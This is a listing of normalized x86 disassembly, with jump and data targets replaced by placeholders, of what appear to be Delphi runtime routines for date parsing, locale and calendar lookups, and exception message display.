pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40ab44
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4043e0
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40ab68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ab44
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4043e0
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40abfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ac75
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac7c
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40ab44
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4043e0
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404640
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4082e8
test eax eax
jne r-xdata
mov eax edi
call sub_4043e0
add [ esi ] eax
mov bl 0x1
sub_40ac88
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40ab44
mov eax esi
call sub_4043e0
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40acc0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4043e0
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40ad0c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4043e0
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c8b4
mov [ ebx ] eax
jmp r-xdata
sub_40ad54
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4045e0
push eax
mov eax [ ebx ]
call sub_4045e0
pop edx
call sub_40ca28
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ada8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409f48
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ae04
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b11f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40acc0
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c964
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40ab68
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40ad0c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404640
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408358
mov eax [ ebp - 0x1c ]
call sub_40ad54
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b126
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_404144
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac88
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40ab68
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac88
test al al
je r-xdata
call sub_409f48
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40ab68
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409cbc
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404724
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac88
mov edx ebx
mov eax esi
call sub_40ab44
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4043e0
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40ad0c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ada8
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ab44
mov eax esi
call sub_4043e0
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409f48
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4043e0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404640
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4082e8
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4043e0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404640
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4082e8
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b148
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abfc
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abfc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abfc
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40ab68
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ab44
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abfc
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac88
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40ab68
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abfc
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac88
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ab44
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409b74
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abfc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40ab68
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abfc
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac88
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abfc
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40ab68
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b33c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ae04
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4043e0
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b370
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b148
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4043e0
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b3a4
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ae04
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b370
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4043e0
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b148
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b430
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404210
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b47c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404174
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404210
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b4c8
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b4f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b47c
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_406030
sub_40b52c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b63f
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b4f0
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404174
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b4f0
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404174
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b4f0
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404174
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b4f0
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404174
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b646
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404144
retn
sub_40b650
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404318
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b68c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b6f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404318
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408738
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6f8
lea eax [ ebp - 0x4 ]
call sub_404120
retn
inc ebx
sub_40b704
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b79b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b47c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408738
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7a2
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b650
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b68c
call EnumCalendarInfoA
sub_40b7b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b97e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404120
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b47c
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408738
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4043e0
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b985
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404144
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408d50
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c878
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404640
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4043e8
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404174
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408d50
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e8
inc ebx
jmp r-xdata
mov eax esi
call sub_4043e0
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408d50
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e8
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e8
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4043e8
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404308
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4043e8
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404308
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4043e8
sub_40b9e8
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b9dc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40cac8
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408c74
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405580
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4032e0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409298
mov eax [ ebp - 0x4 ]
call sub_408c10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4045e0
mov ebx eax
mov eax ebx
call sub_408c10
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40bb70
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b9e8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405580
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402bf4
call sub_40291c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408c10
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bc44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404174
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bcda
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4092d8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bce1
lea eax [ ebp - 0x4 ]
call sub_404120
retn
add esp 0xfffffff0
call sub_4036f4
sub_40bce1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bd00
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_406030
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bd3c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bda8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_406030
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4092d8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bdaf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
add esp 0xfffffff0
call sub_4036f4
sub_40bdaf
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bdd0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404174
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
